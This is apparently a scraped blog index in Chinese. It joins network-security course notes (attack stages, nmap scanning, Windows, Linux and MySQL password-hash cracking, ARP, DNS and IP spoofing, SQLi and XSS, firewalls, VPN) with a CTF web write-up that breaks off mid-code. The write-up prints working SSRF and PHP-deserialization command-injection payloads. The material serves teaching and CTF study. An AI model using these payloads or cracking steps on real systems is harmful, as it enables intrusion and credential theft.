7.公证机制：公正机制对应抗否认性服务。公证机制的作用在于解决收发双方的纠纷问题，确保两方利益不受损害。类似于现实生活中，合同双方签署合同的同时，需要将合同的第三份交由第三方公证机构进行公证。安全机制对安全服务做了详尽的补充，针对各种服务选择相应的安全机制可以有效地提高应用安全性。随着技术的不断发展，各项安全机制相关的技术不断提高，尤其是结合加密理论之后，应用安全性得到了显著提高。本书的后续章节将以加密理论及其相应实现为基础，逐步阐述如何通过加密技术确保企业应用的安全。 0x05黑客攻击类型从安全属性上分类: 阻断攻击，截取攻击，篡改攻击，重放攻击，伪造攻击。 从攻击方式分类： 主动攻击:伪装，回答，修改报文，拒绝服务。 被动攻击:报文内容泄露，通信分析。 第二章 网络攻击流程0x00 黑客攻击流程踩点 —&gt; 扫描 —&gt; 查点 —&gt; 访问/拒绝服务 —&gt; 提权 —&gt; 窃取信息 —&gt; 淹没踪迹 —&gt; 创建后门 0x01 踩点收集目标信息: 123456789101112131415域名；网络地址块 。可以直接从因特网进行访问的各个系统的具体IP地址。已被发现的各个系统上运行的TCP和UDP服务。系统体系结构（例如SPARC或X86）。访问控制机制和相关的访问控制表（access control list，ACL）。入侵检测系统（intrusion detection system，IDS）。各有关系统的细节信息（用户名和用户组名、系统旗标、路由 表、SNMP信息等等）。 DNS主机名。 获取信息方式: 1234公开渠道获取WHOIS查询DNS查询(nslookup,fierce)网络侦查(尝试确定网络的拓扑结构和可能存在的网络访问路径，traceroute) 0x02 搜索引擎使用技巧以google为例: 1234567891011空格或大写的AND： “与”-： “非”大写的“OR” ： “或” site：搜寻结果局限在某个具体网站 //sile:www.cumt.edu.cnlink：返回所有链接到某个url的网页 //link:www.cumt.edu.cninurl：返回的网页链接中包含关键词一，链接中或文档中出现第二个关键词 //inurl:cumt 计算机allinurl：返回的网页链接中包含所有查询关键词allintitle &amp; intitle：类似allinurl和inurl，对网页的标题栏进行查询related：搜索结构内容方面相似的网页 //related:www.cumt.edu.com/index.htmlcache：搜索缓存，快照info：搜索相关信息 0x03 扫描基本步骤确定目标系统是否真实存在， 确定目标系统上那些服务正在运行或监听， 探查操作系统。 0x04 nmap使用技巧网络扫描和嗅探工具包 常用命令： 123456789101112-sP ：进行ping扫描-sn: Ping Scan - disable port scan #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）-sA （发送tcp的ack包进行探测，可以探测主机是否存活）-sS ：半开放扫描（非3次握手的tcp扫描）/*优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root/administrator权限执行*/-sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢-sF：也是tcp的扫描一种，发送一个FIN标志的数据包-sX：圣诞树扫描-sN：空(NULL)扫描-sW：窗口扫描-sV：版本检测 0x05 查点对识别出来的服务进行更为充分的探查 · 用户账号名（用于随后的口令猜测攻击） · 错误配置的共享资源（如不安全的文件共享） · 具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器） 0x06 攻击实施分类： 破坏性攻击：利用工具发动攻击 入侵性攻击：利用收集到的信息，找到其系统漏洞，然后利用漏洞获取尽可能高的权限 主要阶段： 预攻击探测：为进一步入侵提供有用信息 口令破解与提升权限 实施攻击：缓冲区溢出、拒绝服务、后门、木马、病毒 攻击善后： 留后门：长时间地保留和巩固对系统的控制权 隐藏踪迹：删除日志文件，更改日志文件，替换系统程序。 0x07 渗透测试一种通过模拟的攻击者的技术与方法，挫败目标系统的安全控制措施 并取得访问控制权的安全测试方法 分类： 白盒测试：拥有组织机构的内部知识的情况下进行的渗透测试 灰盒测试：拥有一部分内部知识的情况下进行的渗透测试 黑盒测试：模拟一个对组织机构一无所知的攻击者进行的渗透测试 步骤（七步） 1234567前期交互阶段：确定渗透测试范围，目标，限制条件以及服务合同细节。情报搜集阶段：获取目标网络拓扑，系统配置，安全防御措施等信息。威胁建模阶段：针对获取的信息进行威胁建模和攻击规划。漏洞分析阶段：总和汇总的情报信息，从漏扫结果，服务查点信息等找出可实施攻击的点。渗透攻击阶段：利用找出的漏洞入侵系统，获取访问权限。后渗透攻击阶段：根据目标组织经营模式，保护资产形式等自主设计攻击目标。实施能造成重要业务影响的攻击报告阶段：凝聚所有阶段的关键情报信息，发现的系统漏洞，成功的渗透攻击过程，同时分析修补与升级方案 渗透工具: Metasploit 第三章 网络嗅探技术网络监听网络嗅探Network Sniffing)】：在他方未察觉的情况下捕获其通信报文、通信内容的技术，只限于局域网 网卡工作模式: 12341. 广播模式(Broadcast Mode)：网卡能够接收网络中的广播信息2. 组播模式(Multicast Mode)：网卡能够接收组播数据3. 单播模式(Unicast Mode)：只接收目的地址匹配本机MAC地址的数据帧4. 混杂模式(Promiscuous Mode,监听模式)：网卡接收一切数据帧，无论其目的MAC地址是什么 共享式局域网的监听实现方法 交换式局域网的监听技术（重点） 12345溢出攻击：交换机要维护一张MAC地址与端口的映射表（CAM），维护该表的内存有限。如用大量的错误MAC地址的数据，帧对交换机进行攻击，交换机就可能出现溢出。这时交换机就回到广播方式——向所有的端口发送数据包，监听就很容易了（ARP过载, MAC泛洪）ARP欺骗：计算机维护一个IP-MAC地址对应表，该表随着ARP请求/响应不断更新。 通过ARP欺骗，改变表里的对应关系，攻击者可以成为被攻击者与交换机之间的“中间人”，使交换式局域网中的所有数据包都流经攻击者的网卡。 常用的网络监听工具 Wireshark,Tcpdump/Windump 网络嗅探技术防御监听（被动技术，难以发现）的防御：采用安全的网络拓扑结构和数据加密技术（数据内容加密，数据通道加密）。注意重点区域的安全防范。 交换网络下防监听： 主要防止ARP欺骗及ARP过载 主要措施 12341 不要把网络安全信任关系建立在单一的IP或MAC基础上，理想的关系应该建立在IP-MAC的对应关系上2 使用静态ARP或者IP-MAC对照表代替动态的ARP或者IP-MAC对应表——禁止自动更新，使用手动更新3 定期检查ARP请求：使用ARP监视工具如ARPWatch等监视并探测arp欺骗4 制定良好的安全管理策略，加强用户安全意识 第四章 口令破解0x00 口令破解方法暴力破解:穷举，速度慢。 字典攻击：根据用户信息建立起一个用户可能使用的口令表文件，速度快。 组合攻击：在字典列表的基础上增加几个字母或数字进行攻击。 社会工程学：偷窥，网络嗅探，搜索垃圾箱，重放。 0x01 windows口令文件1.安全账户管理器SAM机制。 1C:\\Windows\\System32\\Config\\SAM 2.SAM文件: 含有本地系统或坐在控制域上所有用户名和口令的HASH值。 3.创建口令HASH方法： LAN Manager (LM)：最早使用的密码哈希算法之一 密码的LM哈希步骤 1234561.将口令全部转换为大写2.添加NULL字符，直到口令长度等于14字符，并转化为二进制字符串3.将新口令拆分为两组7位打的字符串4.分别经过str_to_key()函数处理创建两个DES加密密钥，并未每一组添加奇偶校验位，创建出64位的密钥5.使用每个DES密钥加密一个预定义的魔术字符串，获得两个9字节的密文值6.密文值链接成16字节的值，即最终获得的LM哈希。 LM哈希的安全缺陷 12341.des算法密钥太短2.69^7种可能，可以暴力破解3.如果密码长度&lt;=7,则第二部分hash为固定值，因此很容易确定密码的长度范围。4.Hash值在通过网络发送到服务器的时候，没有进行salting操作，容易遭受中间人攻击和重放攻击。 NT LAN Manager V2（NTLMV2): windows2000，XP,VISRA,win7。 NTMLV2安全性：MD4比DES更加健壮，因此可以接受更长的密码，可允许同时使用大小写，不需要将密码拆分为更小更易于破解的片段。 4.安全标示RID：在账号创建是被创建，账号删除时，RID也同时删除，及时用户名相同，每次创建时获得的RID也不同。 5.HASH密码格式： 1用户名：RID：LM-HASH：NT-HASH。 0x02 windows系统的登录与身份认证交互式登录：向本地计算机或域账户确认用户的身份 • 本地账户登录本地计算机：可以使用存储在本地SAM中 的口令散列进行登录——用户输入明文口令，系统对口 令使用相同的加密散列过程，并将散列结果与保存的散 列进行比较，如果匹配，则通过验证 • 域账户登录：默认使用Kerberos V5（身份认证章节） 网络登录：对用户尝试访问的网络服务或资源提供用 户验证。可以使用多种网络身份验证机制，如 Kerberos V5、安全套接字/传输层安全（Secure Socket Layer/Transport Layer Security，SSL/TLS） 以及与Windows NT 4.0兼容的NTLM机制 基于挑战/响应机制（C/R，Challenge/Response） 0x03 Unix/linuxLinux是一套免费使用和自由传播的Linux 类 操作系统 Unix ，是一个基于 POSIX的多用户、 多任务 、支持多线程和多CPU的操作系统。它能运行主要的CPU 工具软件、应用程序和UNIX 议 ， 支持网络协位 32 和位 64 硬件。 Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。 1.特点：自由开放，配备需求低廉，功能强大而稳定，真正的多用户多任务。 2.与WINDOWS不同 123Linux严格区分大小写Linux中所有内容都以文件的形式保存，包括硬件Linux不以扩展名来区分文件类型 3.linux密码 修改密码指令 passwd 密码系统： 12/etc/passwd: 包含了用户名、用户的真实姓名、标 识信息以及每个用户的基本信息，各个域之间用”:” 隔开/etc/shadow: 影子密码文件，包含了加密过的密码以 及密码失效时间 加密方式： 12过去:单向函数crypt(),基于DES算法现在:Unix Salt,crypt16(),MCF（模块化加密格式） 4.UID/GID 用户标识符UID： 12341~499：用于系统功能500~： 用户0：超级用户保留（当UID为0的用户运行一个进程时， 内核对该进程取消了大部分的安全检查）//Unix的特权是根据UID来确定的，与Unix账 号无关 组标识符GID 12345每个Unix用户都属于一个或者几个组每个用户都隶属于一个主用户组，存储在/etc/passwd文件中可以利用组来限制一些用户对敏感信息或者特殊许可的应用程序的访问权/etc/group：列出了计算机上所有的组/etc/gshadow：计算机上所有组的群组影子密码文件 基本命令 12345groupadd 新建用户组groupmod 更改用户组名称或组编号 -n 组名称 -g 组编号groupdel 删除用户组 useradd 增加新用户 -g 指定用户所属的组 -G 指定用户所属的附加组usermod 修改用户信息 -l 修改用户名称 -L 锁定用户密码 0X04 MYSQL口令破解用户名密码保存在mysql数据库中user表中 找到user.MYD user.MYI user.frm拷贝到自己的数据库中 123use mysql;select user,password from user; 提取hash。 带号的HASH值是MYSQL5的HASH，不带号的是旧版MYSQL的HASH。 然后利用Cain &amp; Abel || cmd5破解 0x05 暴力破解工具Hydra 破解服务：FTP、TELNET、SMB、MSSQL、MYSQL、 POP3、SSH、REDIS等 Medusa “美杜莎”，一款强大的破解工具，可以迅速的、大规模 并行的、模块化的暴力破解程序 John the ripper:一个密码工具软件。主要支持对DES、MD5两种加密 方式的密文进行破解工作。可以工作于多中不同的机 型以及多 种不同的操作系统之下 第五章 欺骗攻击0x00 欺骗冒充身份通过认证以骗取信任的攻击方式 攻击者针对认证机制的缺陷，将自己伪装成可信任方， 从而与受害者交流，以获取信息或者展开进一步攻击 常见的欺骗攻击 12345ip欺骗ARP欺骗邮箱欺骗DNS欺骗WEB欺骗 0x01 IP欺骗IP协议：非面向连接，两台计算机的信任连接主要依 靠双方的IP地址 IP欺骗的方式： 123简单的IP地址更改:攻击者将一台计算机的IP地址修改为其它主机的地址， 以伪装冒充其它机器源路由攻击：保证数据包始终会经 过一条经定的途径，而攻击者机器在该途径中TCP会话劫持:接管现存动过程，即攻击者可以替代原来的合法用户，同时监视并掌 握会话内容 TCP会话劫持步骤 1.发现攻击目标 ​ ①目标是一个准予TCP 会话连接（例如Telnet和FTP等）的服务器 ​ ②能否检测数据流 2.确认动态会话 3.猜测序列号 ​ ①通过嗅探或者ARP欺骗，先发现目标机正在使用 的序列号，再根据序列号机制，可以猜测出下一 对SEQ/ACK序列号 ​ ② 同时，攻击者若以某种方法扰乱客户主机的SEQ/ACK，服务器将不再相信客户主机正确的数据包，从而可以伪装为客户主机，使用正确的 SEQ/ACK序列号，现在攻击主机就可以与服务器进 行连接，这样就抢劫一个会话连接。 4.使客户主机下线 ​ 对其进行拒绝服务攻击 5.接管会话 ​ ①持续向服务器发送数据包并且接管整个会话 ​ ②创立账户留下后门 TCP会话劫持的危害 ​ 1.就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击 ​ 2产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生. 原因： 一个最主要的原因就是它并不依赖于操作系统，另一个原因就是它可以被用来进行积极的攻击，通过攻击行为可以获得进入系统的可能。 工具 ： Juggernaut ; Hunt IP欺骗的防御——路由器过滤 1.防范基本的IP欺骗：入口过滤，出口过滤。 2.防范源路由欺骗：设置路由器禁止源路由。 3.防范会话劫持（没有有效的办法可以根本上防范会话 劫持攻击，只能尽量减少攻击带来的危害）： ​ ① 加密 ​ ②使用安全协议 SSH ​ ③限制保护，允许外网到内网的信息越少越安全。 0x02 ARP欺骗1.arp基础知识 1234567891011121.地址解析协议，用于将计算机的网络地址（IP地址32位）转化为物理地址（MAC地址48位）。属于链路层的协议。2.数据帧从一个主机到达局域网内的另一台主机是根据48位的以太网地址来确定的，而不是32位IP。3.内核（如驱动）必须知道目的端的硬件地址才能发送数据。4.ARP请求包：ARP工作时，送出一个含有目的IP地址的以太网广播数据包，这也就是ARP请求包。它表示：我想与目的IP通信，请告诉我此IP的MAC地址。ARP请求包格式如下：arp who-has 192.168.1.1 tell 192.168.1.25.当目标主机收到ARP请求包，发现请求解析的IP地址与本机IP地址相同，就会返回一个ARP应答包。它表示：我的主机就是此IP，我的MAC地址是某某某。ARP应答包的格式如下：arp reply 192.168.1.1 is-at 00:00:0c:07:ac:006.arp缓存表： ①ARP缓存表用于存储其它主机或网关的IP地址与MAC 地址的对应关系。 ②每台主机、网关都有一个ARP缓存表。 ③ARP缓存表里存储的每条记录实际上就是一个IP地址与MAC地址对，它可以是静态的，也可以是动态的。如果是静 态的 ，那么该条记录不能被ARP应答包修改； 如果是动态的，那么该条记录可以被ARP应答包修改。 2. arp的缺陷 1234主机收到应答包后 ： 不验证自己是否发送过对应的arp请求。 不验证该回应包是否可信 直接用应答包里的信息替换ARP缓存表中的原有信息 3. arp欺骗的原理 主机A和主机B在同一个局域网内，B无脑的向A 发送 ARP Reply, 告诉 主机A 路由器的 MAC 是 xxxB， B 无脑的向路由器发送 ARP Reply, 告诉路由器 主机A 的 MAC 是 xxxB。这样主机A通过路由器发出的数据和路由器返回给主机A的数据都会经过主机B。主机B就完成了对A的arp欺骗。 4.arp欺骗的后果 123导致同网段的其他用户无法正常上网.嗅探交换式局域网内的所有数据包，从而获取敏感信息.对信息进行篡改，修改重要信息，进而控制受害者会话. 5.arp欺骗的检测 1234网络频繁掉线.网络突然莫名其妙的慢.使用arp –a命令发现网关的MAC地址与真实的网关MAC地址不同.使用网络嗅探软件发现局域网存在大量ARP响应包. 6.arp欺骗的防御 12345MAC地址绑定使用静态ARP缓存使用ARP服务器（确保该服务器不被控制）使用ARP欺骗防护软件，如ARP防火墙及时发现进行ARP欺骗的主机，并将其隔离 0x03 邮件欺骗1.邮件系统的组成 123用户代理传输代理投递代理 2.电子邮件欺骗的方法 ​ 利用相似的电子邮件地址。 ​ 直接使用伪造的E-mail地址。 3.电子邮件欺骗的防御 ​ ①邮件接收者：合理配置邮件客户端，使总能显示完整的电子邮件地址，而不仅仅显示别名，完整的电子邮件地址能提供表明正在发生一些不平常事情的一些迹象。 ​ ②邮件发送者：如使用foxmail或者outlook之类的邮件客客户端。 ​ ③邮件服务器提供方采用SMTP身份验证机制：新SMTP协议规范新增2个命令(VRFY,EXPN) ，对发件人进行身份认证，一定程度上降低了匿名/垃圾邮件的风险。 ​ ④邮件加密：OpenPGP，S/MIME。 0x04 DNS欺骗1.DNS欺骗的原理及实现步骤 当向本地DNS服务器查询域名时，如果服务器缓存中已有相应记录，就直接将这条记录返回给用户。DNS欺骗的关键是在DNS服务器的本地Cache中缓存一条伪造的解析记录。 123456789if 攻击者可以控制本地域名服务器 : 在其数据库中增加一个附加记录，将攻击目标的域名(例 如www.cumt.edu.cn)指向攻击者的欺骗IPif 攻击者无法控制DNS服务器: 但可以控制DNS服务器所在网络的某台主机，并可以监听该网络中的通信情况。黑客要对远程的某DNS服务器进行欺骗,首先，黑客要冒充某个域名服务器的IP地址.其次，黑客要能预测目标域名服务器所发送DNS数据包的ID号.(确定目标DNS服务器的ID号为DNS欺骗攻击的关键)if 即使无法监听拥有DNS服务器的网络，也有办法得到目标DNS服务器的ID号: 1. 向目标DNS服务器请求某个不存在域名地址（但该域存在） 2. 冒充所请求域的DNS服务器，向目标DNS服务器连续发送应 答包，包中的ID号依次递增 3. 一段时间后，再次向目标DNS服务器发送针对该域名的解析 请求，如果得到返回结果，就说明目标DNS服务器接受了刚才的伪造应答，否则，再次尝试。 0x05 WEB欺骗创造一个完整的令人信服的Web世界，但实际是一个虚假的复制。 Web欺骗成功的关键是在受害者和真实Web服务器之 间插入攻击者的Web服务器—中间人攻击（man-in-the-middle)。 第六章 web攻击0x00 概述1.Web服务器的安全： 利用Web服务器漏洞进行攻击，如IIS缓冲区溢出漏洞、目录遍历漏洞等。 利用网页自身的安全漏洞进行攻击，如SQL注 入，跨站脚本攻击等 2.Web客户端的安全 Java Applet、ActiveX、Cookie等大量被使用，当编辑内容时，应用程序会自动下载并运行，如果被恶意使用，则可以窃取、改变或删除客户机上的信息。 浏览器存在众多漏洞，可以写一个利用某漏洞的网页并挂上木马，当用户访问网页之后就中了木马。即网页木马，简称网马。 跨站脚本攻击对于客户端的安全威胁：利用XSS的 Web蠕虫已经在网络中肆虐过。 3.Web通信信道的安全 面临网络嗅探和以拥塞信道、耗费资源为目的的拒绝服务攻击的威胁。 4.工具 目标操作系统和网络服务扫描：NMAP，Nessus，Nexpose Web应用扫描工具：Burp Suite，AWVS. 0x01 SQL注入1.原理 利用Web应用对后台数据漏洞，攻击者提交一段精心构造的数据库查询代码， 根据返回的结果，获得他想得知的数据。 2.注入分类 普通注入：利用union查询等来进行注入。 报错注入：根据报错信息进行注入。 盲注：bool盲注，时间盲注。 3.注入位置 只要执行了了数据库查询语句的地方都可能存在注入。 4.sql注入防范 ①使用预编译语句，绑定变量 ②对用户提交的数据和输入参数进行严格的过滤 ③摒弃动态 SQL 语句，改用存储过程来访问和操作数据 ④使用安全函数 ⑤最小权限原则 12更多注入细节步骤利用sqli-labs进行sql注入练习 参考：http://altman.vip/2018/02/05/sqli-labs%201/ 0x02 XSS攻击者往Web页面里插入恶意html代码，当用户浏览该网页时， 嵌入其中的恶意代码被执行，达到特殊目的。 一旦得手，黑客可以盗取用户帐户，修改用户设置，盗取 /污染cookie，做虚假广告，查看主机信息等。 1.跨站脚本攻击发起条件 Web服务器允许用户在表格或编辑框中输入不相关的字符。 Web服务器存储并允许把用户输入显示在返回给终端用户的页面上，而没有去除非法字符或者重新进行编码。 2.攻击实现条件 需要存在跨站脚本漏洞的web应用程序 需要用户点击连接或者访问某一页面 3.分类 反射型XSS（XSS Reflection,非持久性的XSS）：简单的将用户输入数据“反射”给浏览器，黑客需要诱导用户点击一个恶意链接。 存储式XSS（Stored XSS）：攻击脚本永久存储在目标服务器数据库或者文件中，比如黑客写下一篇含有恶意JavaScript代码的博客文章。 DOM型XSS：利用 DOM（文档解析功能）发动攻击。 4.防御 用户：教育为主 Web应用开发者： ​ 对所有用户提交内容进行可靠的输入验证。 ​ 保护所有敏感的功能，以防被机器人自动执行或者被第三方网站所执行。 0x03 跨站请求伪造 (CSRF)原理： 防御： 123通过验证码进行防御通过Referer Check检查请求来源增加请求参数 token 0x04 web攻击防御1.简单性:主机系统越简单，其安全性就越好。最好把不必要的服 务从服务器上卸载掉。 2.超级用户权限：尽量不用超级用户来维护系统。 3.本地和远程访问控制：访问控制是用来指定哪些用户可以访问系统的特定数据、 目录或功能。应该实现一套有效的身份验证机制，并包含用户的日志记录。 4.审计和可审计性:主要指平时对记录进行审计，在系统生成的大量审计记录 中查找可疑数据，查找攻击者或恶意程序的踪迹. 5.恢复：配置实时或增量备份策略是非常必要的，在紧急关头可以使得服务器的关键数据得以保存，从而可以迅速恢复服务以减少损失，同时便于事后取证的进行，以追查入侵者。 第七章 缓冲区溢出0x00 概述什么是缓冲区: 包含相同数据类型实例的一个连续的计算机内存块， 是程序运行期间在内存中分配的一个连续区域，用于保存包括字符数组在内的各种数据类型。 缓冲区溢出（Buffer Overflow）：向固定长度的缓冲区中写入超出其预定长度的内容，造成缓冲区数据溢出，从而覆盖缓冲区周围的内存空间。 黑客借此精心构造填充数据，可以修改内存中变量的 值，导致原有流程改变，甚至可以劫持进程，执行恶意代码，最终获取系统控制权。 其他攻击类型相比，缓冲区溢出攻击： 123技术性强破坏力大隐蔽性强 0x01 缓冲区溢出原理栈溢出 堆溢出 BSS溢出 格式化串溢出 整数溢出 0x02 防御缓冲区溢出的真正原因在于编程语言缺乏类型安全，程序缺少边界检查。 源码级保护方法 运行期保护方法 阻止攻击代码执行 加强系统防护 第八章 身份认证1.AAA机制：认证，授权，审计。 2.认证分类 123基于口令认证：简单口令认证，基于单向函数的口令认证，一次性口令认证。基于生理特征的认证。基于地址的认证：每个主机存储着可以访问本机的其他主机的账号信息，这样只要确认了对方的主机地址，就可以进行用户验证。 3.Kerberos认证协议 基于可信第三方（Trusted Third Party，TTP）的认证协议；MIT的雅典娜项目组（Athena Group）开发的认证服务系统，基于对称加密技术。 基本思想（假设）：能正确对信息进行解密的用 户就是合法用户 三个子协议: 1231. 认证服务器交换（AS交换）：在客户C和AS间进行2.票证授予服务器交换(TGS交换）：在C和TGS间交换3.客服服务器认证应用交换(AP交换)：在C和应用服务器S间进行 构成 : 一个完整的 Kerberos 环境包括一个 Kerberos 服务器，一组工作站和一组应用服务器。 4.公钥基础设施PKI PKI：以公钥算法为中心的密钥管理体系，能提供公钥教秘和数字证书服务，采用证书管理公钥，通过可信第三方CA把用户公钥和用户的其他标识信息捆绑在一起。 5.PKI的组成 12345认证中心(CA)证书库密钥备份及恢复系统证书作废处理系统客户端证书处理系统和 第九章 防火墙0x00 基本原理1.防火墙是位于两个网络间的实施网间访问控制的组件的集合,防火墙通常是单独的计算机、路由器或专有硬件设备， 充当访问网络的唯一入口点。 123内网和外网的所有网络数据流必 须经过防火墙.只有符合安全策略的数据流才能通过防火墙.防火墙自身对渗透(penetration) 是免疫的. 2.处理方式 ACCEPT:允许数据包或信息通过 Reject:拒绝数据包或信息通过，并且通知信息源该信息被进制 Drop:直接将数据包或信息丢弃，不通知信息源 3.基本策略 默认允许原则：没有明确禁止的都是允许的 默认拒绝原则：没有明确允许的都是禁止的 4.主要功能 网络安全的屏障 强化网络安全策略 对网络存取和访问进行监控审计 防止内部信息的外泄 ###0x01 防火墙的分类 1.包过滤防火墙 工作在网络层和传输层。设定访问控制列表ACL（Access Control List），检查所有通 过的数据包。 发展：静态包过滤防火墙，动态包过滤防火墙（状态检测）。 1234567优点：逻辑简单，价格便宜，对网络性能的影响较小，有较强的透明性。与应用层无关。缺点：需要对IP、TCP、UDP等协议有深入了解，否则容易出现因配置不当而带来问题。过滤有限，不能充分满足各种安全要求。不能彻底防止地址欺骗。 2.代理服务器 应用层代理/代理服务器通过在主机上运行代理服务程 序，直接对特定的应用层进行服务，因此也称应用型防火墙。 12345678优点：1.易于配置，界面友好。2.不允许内外网主机的直接链接。3.提供详细日志。4.可以隐藏用户内部的IP，可以给单个用户授权缺点：1.速度相对慢。2.需要为不同的网络服务建立专门的代理服务。 3.电路级网关 监控受信任的客户或服务器与不受信任的主机间的TCP握手信息，以决定会话是否合法。 网络地址转换（NAT）：属接入广域网技术，一种将私有IP地址转化为合法广域网IP地址的转换技术，被广泛应用。 NAT分类：静态NAT，动态NAT，端口转换NAPT。 4.混合型防火墙 0x02 防火墙的配置方案1.屏蔽路由器：最简单的防火墙配置，直接在内网和 外网之间加装一个包过滤路由器或者应用网关 2.双宿主机模式：采用主机替代路由器执行安全控制功能， 类似于包过滤防火墙，是外部网络用户进入内部网络的唯一通道。 特点：主机的路由功能被禁止，两个网络间的通信通过双宿主机完成。 弱点：一但堡垒机被攻破，可任意访问内网。 3.屏蔽主机模式：包过滤路由器连接外网，堡垒主机安装在内网。 4.屏蔽子网模式：较流行的一种结构，采用两个包过滤路由器和一个堡垒主机，在内外网络之间建立一个被隔离的子网，称为DMZ 0x03 WAF通过执行一系列针对HTTP/HTTPS的安全策略来专门为 Web应用提供保护。 分类: 硬件WAF 软件WAF 代码级WAF 第十章 虚拟专用网(VPN)0x00 VPN基础虚拟专用网（Virtual Private Network, VPN）是在公共网络上传输私有通信的方法。 优点：节省开支，安全，服务质量保证，可扩展性，容易访问，可管理性。 分类： 123企业外部VPN：外部的客户，合作伙伴等安全访问企业网络。企业内部VPN：企业总部、远程办事处和分公司等安全访问企业网络。远程访问VPN：使用PSTN，ISDN,DSL和移动IP等方法接入。 0x01 隧道隧道化: 123通过internet基础设施，在企业网络间传递数据。传递的数据可以是不同协议的网络包。隧道协议将不同类型协议的数据包重新封装在新的包中发送。 主要隧道协议 PPTP和L2TP比较 GRE:通过隧道将通信从一个专用网络传输到另一个专用网络。本身不提供安全性。 0x02 IPSEC1.IPSEC的概述 IPSec(IP Security)是用于构建VPN的一系列协议，正在成为创建VPN的标准。 为提供加密安全服务而开发，支持认证、完整性、访问控制以及数据一致性。 IPSec只允许IP数据的封装和加密。 2.工作模式 传输模式（Transport Mode）：点到点。 隧道模式（Tunnel Mode）：站点到站点。 3.组成 Internet密钥交换协议（IKE）：提供协商安全参数和创建认证密钥等。 负载安全封装（ESP）：提供加密，认证和数据保护。 认证报头协议（AH）：提供认证和数据保护。 4.功能 访问控制，无连接的完整性，数据源认证，防止重放攻击，机密性。 5.工作过程 6.分组分装 分组封装由ESP或AH或两者一起处理。 AH：为IP数据报提供无连接的 完整性和数据源认证的机制 ESP：提供了AH的大部分保护加上额外的机密性 7.IKE 因特网密钥交换协议：用于协商IPSec安全关联（security association， SA），要求IPSec系统首先进行身份认证，并且建立ISAKMP或者IKE共享密钥。 主要负责： 1234协商协议的参数交换公共密钥对双方进行认证在交换后对密钥进行管理 //wating","categories":[],"tags":[{"name":"课程复习","slug":"课程复习","permalink":"http://altman.vip/tags/课程复习/"}]},{"title":"第四届上海市大学生网络安全赛-WEB&MISC","slug":"第四届上海市大学生网络安全赛-WEB","date":"2018-11-04T06:14:36.000Z","updated":"2018-11-05T12:53:59.179Z","comments":true,"path":"2018/11/04/第四届上海市大学生网络安全赛-WEB/","link":"","permalink":"http://altman.vip/2018/11/04/第四届上海市大学生网络安全赛-WEB/","excerpt":"1文章首发于https://www.freebuf.com/column/188520.html WEBweb1查看robots.txt得知flag.php和source.php访问source.php，需要以管理员登录 POST数据admin=1需要伪造IP为127.0.0.1多番尝试后发现可以用x-client-ip绕过","text":"1文章首发于https://www.freebuf.com/column/188520.html WEBweb1查看robots.txt得知flag.php和source.php访问source.php，需要以管理员登录 POST数据admin=1需要伪造IP为127.0.0.1多番尝试后发现可以用x-client-ip绕过添加http头x-client-ip:127.0.0.1POST数据url=http://www.ichunqiu.com得到一个图片地址，将图片数据下载下来后发现是www.ichunqiu.com网站首页源码。显然是ssrf那么接下来就要构造url读取其他文件。利用file://协议读取本地文件，绕过检测最终得到payload url=file://www.ichunqiu.com//var/www/html/flag.php 将JPG文件下载然后查看内容 web2一道反序列化题目.index.php.swp发现源码 1vim -r index.php 恢复源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(\"/[&lt;&gt;*;|?\\n ]/\",\"\",$str); $str=str_replace('flag','',$str); return $str; &#125; function echo($host)&#123; system(\"echo $host\"); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"echo\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===\"doller\")&#123; @parse_str($_GET['a']); if($var===\"give\") &#123; if($bbb===\"me\") &#123; if($ccc===\"flag\") &#123; echo \"&lt;br&gt;welcome!&lt;br&gt;\"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo \"&lt;br&gt;think about it&lt;br&gt;\";&#125; &#125; else &#123; echo \"NO\"; &#125;&#125;else&#123; echo \"Can you hack me?&lt;br&gt;\";&#125;?&gt; 很明显的反序列化首先简单的构造打出welcome回显，进入POST语句然后构造反序列化然后上传成功执行命令。获取flag的过程中发现空格被bypass了，这里用$IFS绕过双写flag绕过过滤最终payload1O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A18%3A%22%60cat%24IFS%2Fflaflagg%60%22%3B%7D%7D web31234567891011121314151617181920212223242526272829直接给了源码&lt;?php //error_reporting(0); //$dir=md5(\"icq\" . $_SERVER['REMOTE_ADDR']); $dir=md5(\"icq\"); $sandbox = '/var/sandbox/' . $dir; @mkdir($sandbox); @chdir($sandbox); if($_FILES['file']['name'])&#123; $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name']; if (!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(\"emmmm...\"); &#125; $new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $_ = $_POST['hehe']; 